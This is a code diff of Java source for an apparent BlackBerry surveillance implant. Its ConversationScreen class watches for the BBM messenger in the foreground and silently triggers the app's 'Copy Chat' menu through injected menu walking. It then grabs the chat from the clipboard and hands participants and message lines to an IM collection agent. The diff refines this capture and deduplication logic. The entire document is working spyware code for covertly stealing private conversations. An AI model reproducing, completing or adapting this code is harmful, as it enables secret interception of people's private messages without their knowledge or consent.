@@ -16,12 +16,14 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import net.rim.device.api.util.Arrays;
 import blackberry.agent.ClipBoardAgent;
 import blackberry.agent.ImAgent;
+import blackberry.crypto.Encryption;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.MenuWalker;
-import blackberry.utils.Check;
 
 public class ConversationScreen {
     //#ifdef DEBUG
@@ -56,46 +58,54 @@ public class ConversationScreen {
             debug.info("leech active screen: " + screen);
             //#endif
 
-            if (screen.getClass().getName().indexOf("ConversationScreen") >= 0
-                    && bbmApplication.isForeground()) {
+            if (bbmApplication.isForeground()) {
+                if (screen.getClass().getName().indexOf("ConversationScreen") >= 0) {
 
-                String conversation = extractConversation(screen);
+                    String conversation = extractConversation(screen);
 
-                if (!conversationScreens.contains(screen)) {
-                    //#ifdef DEBUG
-                    debug.info("Added new conversation screen: " + screen);
-                    //#endif
-                    conversationScreens.addElement(screen);
-                    conversations.put(screen,
-                            new Integer(conversation.hashCode()));
-                    // exploreField(screen, 0, new String[0]);
-                } else {
-                    // se conversation e' uguale all'ultima parsata non fare niente.
-                    Integer hash = (Integer) conversations.get(screen);
-                    if (hash.intValue() == conversation.hashCode()) {
+                    if (!conversationScreens.contains(screen)) {
                         //#ifdef DEBUG
-                        debug.trace("getConversationScreen: equal conversation, ignore it");
+                        debug.info("Added new conversation screen: " + screen);
                         //#endif
-                        return;
+                        conversationScreens.addElement(screen);
+                        conversations
+                                .put(screen, Encryption.SHA1(conversation));
+
+                        // exploreField(screen, 0, new String[0]);
+                    } else {
+                        // se conversation e' uguale all'ultima parsata non fare niente.
+                        byte[] hash = (byte[]) conversations.get(screen);
+                        if (Arrays.equals(hash, Encryption.SHA1(conversation))) {
+                            //#ifdef DEBUG
+                            debug.trace("getConversationScreen: equal conversation, ignore it");
+                            //#endif
+                            return;
+                        }
                     }
-                }
 
-                Vector result = parseConversation(conversation);
+                    // parse della conversazione.
+                    Vector result = parseConversation(conversation);
 
-                if (result != null) {
-                    //#ifdef DBC
-                    Check.asserts(result.size() == 2, "wrong size result:  "
-                            + result.size());
-                    //#endif
+                    if (result != null) {
+                        //#ifdef DBC
+                        Check.asserts(result.size() == 2,
+                                "wrong size result:  " + result.size());
+                        //#endif
 
-                    String partecipants = (String) result.elementAt(0);
-                    Vector lines = (Vector) result.elementAt(1);
+                        String partecipants = (String) result.elementAt(0);
+                        Vector lines = (Vector) result.elementAt(1);
 
-                    ImAgent agent = ImAgent.getInstance();
-                    agent.add(partecipants, lines);
+                        ImAgent agent = ImAgent.getInstance();
+                        agent.add(partecipants, lines);
 
-                    //#ifdef DEMO
-                    Debug.ledFlash(Debug.COLOR_YELLOW);
+                        //#ifdef DEMO
+                        Debug.ledFlash(Debug.COLOR_YELLOW);
+                        //#endif
+                    }
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("getConversationScreen no screen: "
+                            + screen.getClass().getName());
                     //#endif
                 }
             }
@@ -120,16 +130,16 @@ public class ConversationScreen {
         debug.trace("extractConversation");
         //#endif
 
-        String before = (String) Clipboard.getClipboard().get();
-        String clip = "";
+        //String before = (String) Clipboard.getClipboard().get();
+        String clip = null;
         // debug.trace("try copy chat: "+screen);
+        ClipBoardAgent.getInstance().suspendClip();
         if (MenuWalker.walk(new String[] { "Copy Chat", "Copy History" },
                 screen, true)) {
 
-            ClipBoardAgent.getInstance().suspendClip();
             clip = (String) Clipboard.getClipboard().get();
             ClipBoardAgent.getInstance().setClip(clip);
-            
+
             try {
                 //Clipboard.getClipboard().put(before);
             } catch (Exception ex) {
@@ -144,15 +154,13 @@ public class ConversationScreen {
                 //#endif
             }
 
-            //debug.info("Clip: "
-            //        + clip.substring(0, Math.min(100, clip.length())));
-            return clip;
         } else {
             //#ifdef DEBUG
             debug.info("NO Conversation screen!");
             //#endif
-            return null;
         }
+        ClipBoardAgent.getInstance().resumeClip();
+        return clip;
     }
 
     public static Vector parseConversation(String conversation) {
